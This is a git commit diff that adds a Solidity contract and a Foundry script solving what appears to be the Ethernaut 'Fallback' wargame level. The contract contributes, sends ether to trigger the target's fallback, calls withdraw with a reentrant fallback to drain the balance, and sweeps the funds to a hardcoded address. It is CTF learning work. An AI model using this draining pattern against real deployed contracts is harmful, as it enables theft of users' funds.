d0718a244fa7fc21776cbba4338570d3204914e2
JimLiu <jim.liu123@ehsn.com.tw>
2024-01-16 09:59:40 +0800

    add external contract

--- script/Fallback.s.sol
+++ script/Fallback.s.sol
@@ -2,25 +2,26 @@
 pragma solidity ^0.8.13;
 
 import {Script, console2} from "forge-std/Script.sol";
+import {AttackFallback} from "../src/AttackFallback.sol";
 
 contract FallbackScript is Script {
-    address public ethernaunt = 0xd7dbCDF0Efc84fD1362C626d75Ea7de74703AF23;
+    
     
     function setUp() public {}
 
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        IExpose raget = IExpose(ethernaunt);
+        AttackFallback attack = new AttackFallback();
+        vm.deal(address(attack),0.0002 ether);
+
+        attack.contribute();
+        attack.sendEth();
+        attack.withdraw();
+
+        attack.get(payable(0xc8Bd59d60961bEdb12c95079250d3075b9328a2d));
 
         vm.stopBroadcast();
     }
 }
 
-interface IExpose {
-    function contribute() external payable;
-
-    function getContribution() external view returns (uint);
-
-    function withdraw() external;
-}
---
+++ src/AttackFallback.sol
@@ -0,0 +1,45 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract AttackFallback {
+    address public constant ethernaunt = 0xd7dbCDF0Efc84fD1362C626d75Ea7de74703AF23;
+    IExpose target;
+    address owner;
+
+    constructor() payable {
+        target = IExpose(ethernaunt);
+        owner = msg.sender;
+    }
+
+    function contribute() external payable {
+        target.contribute{value: 0.0001 ether}();
+    }
+
+     function sendEth() external {
+        payable(address(target)).send(0.0001 ether);
+    }
+
+     function withdraw() external {
+        target.withdraw();
+    }
+
+    fallback() payable external{
+        if(address(target).balance > 0){
+            target.withdraw();
+        }
+    }
+
+    function get(address payable to) external {
+        require(owner == msg.sender);
+        to.transfer(address(this).balance);
+    }
+}
+
+
+interface IExpose {
+    function contribute() external payable;
+
+    function getContribution() external view returns (uint);
+
+    function withdraw() external;
+}
